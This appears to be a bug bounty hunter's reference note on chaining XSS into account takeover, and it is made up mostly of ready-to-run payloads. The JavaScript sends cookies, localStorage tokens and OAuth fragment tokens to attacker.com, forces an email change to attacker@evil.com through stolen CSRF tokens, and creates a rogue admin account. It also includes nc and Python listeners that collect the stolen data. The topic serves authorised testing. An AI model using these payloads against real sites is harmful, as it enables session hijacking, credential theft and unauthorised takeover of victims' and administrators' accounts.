---
tags: [bugbounty, chain, xss, ato, p1, p2]
aliases: [XSS to ATO, XSS Chain, Cookie Theft]
cssclasses: [bb-hunter]
updated: 2026-04-21
---

# Chain: XSS → Account Takeover

> [!tldr] Chain Summary
> XSS bug → steal session cookie or OAuth token → log in as victim.
> **Severity uplift:** Reflected XSS (P3) → Stored XSS (P2) → ATO with cookie theft (P1)
> **Prerequisites:** XSS that executes in victim's browser; HttpOnly=false or token in localStorage.

---

## Chain Map

```
[XSS discovered]
      ↓
[Check cookie attributes]
Document.cookie accessible? → HttpOnly=false
      ↓ (if HttpOnly)
[Alternative paths]
  → Steal localStorage token
  → CSRF via XSS (read CSRF token, then POST)
  → Steal OAuth token from URL hash/fragment
  → Session fixation via XSS
      ↓
[Exfiltrate to attacker server]
      ↓
[Use stolen session/token to log in as victim]
      ↓
[Full account takeover — P1]
```

---

## Path 1 — Cookie Theft (HttpOnly=false)

```javascript
// Basic cookie steal
new Image().src = 'https://attacker.com/steal?c=' + document.cookie;

// Encoded (WAF bypass)
fetch('https://attacker.com/steal?' + btoa(document.cookie));

// Via XHR
var x = new XMLHttpRequest();
x.open('GET', 'https://attacker.com/?c=' + encodeURIComponent(document.cookie));
x.send();

// Payload to inject
<script>document.location='https://attacker.com/?c='+document.cookie</script>
<img src=x onerror="fetch('https://attacker.com/?c='+encodeURIComponent(document.cookie))">
```

---

## Path 2 — localStorage Token Steal

```javascript
// Read token from localStorage
var token = localStorage.getItem('access_token') || 
            localStorage.getItem('token') ||
            localStorage.getItem('jwt') ||
            localStorage.getItem('auth');

fetch('https://attacker.com/?t=' + encodeURIComponent(token));

// Or grab all localStorage
var data = JSON.stringify(localStorage);
fetch('https://attacker.com/?d=' + btoa(data));
```

---

## Path 3 — CSRF via XSS (If HttpOnly=true, SameSite set)

```javascript
// Step 1: Read CSRF token from page
fetch('/account/settings')
  .then(r => r.text())
  .then(html => {
    // Extract CSRF token
    const m = html.match(/name="csrf[_-]token"[^>]+value="([^"]+)"/);
    const token = m ? m[1] : '';
    
    // Step 2: Use it to change email
    return fetch('/account/email/change', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-CSRF-Token': token
      },
      body: 'email=attacker@evil.com&csrf_token=' + token
    });
  })
  .then(() => {
    // Notify attacker
    fetch('https://attacker.com/done');
  });
```

---

## Path 4 — OAuth Token Theft via Implicit Flow

```javascript
// If app uses OAuth implicit flow (response_type=token):
// Token appears in URL fragment: #access_token=XXX

// XSS payload to steal fragment token from redirect
// Inject into a page that receives OAuth redirects:
if (location.hash.includes('access_token')) {
  fetch('https://attacker.com/?t=' + encodeURIComponent(location.hash));
}
```

---

## Path 5 — Admin XSS → Password Change

```javascript
// If XSS executes in admin panel:
// 1. Read admin CSRF token
fetch('/admin/settings')
  .then(r => r.text())
  .then(html => {
    const csrf = html.match(/csrf[_-]token[^>]+value="([^"]+)"/)[1];
    // 2. Create new admin account or change password
    return fetch('/admin/users/create', {
      method: 'POST',
      headers: {'Content-Type': 'application/json', 'X-CSRF-Token': csrf},
      body: JSON.stringify({email: 'attacker@evil.com', role: 'admin', password: 'hacked123'})
    });
  });
```

---

## Attacker Server Setup (Receive Stolen Data)

```bash
# Quick netcat listener
nc -lvnp 8080

# Python HTTP server with logging
python3 -c "
import http.server, urllib.parse

class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        print('[STOLEN]', urllib.parse.unquote(self.path))
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'ok')
    def log_message(self, *a): pass

http.server.HTTPServer(('', 8080), H).serve_forever()
"

# Or use interactsh
interactsh-client -v  # captures HTTP + DNS
```

---

## Impact Escalation

| XSS type | + Chain | Impact |
|----------|---------|--------|
| Self-XSS | + CSRF to trigger | P2 → P1 |
| Reflected XSS | + Cookie theft | P2 → P1 |
| Stored XSS | Standalone | P1 |
| Stored XSS in admin | + CSRF action | Critical P1 |
| DOM XSS in auth flow | + Token steal | P1 |

---

## References

- PortSwigger XSS to account takeover — https://portswigger.net/web-security/cross-site-scripting/exploiting
- HackTricks XSS exploitation — https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting
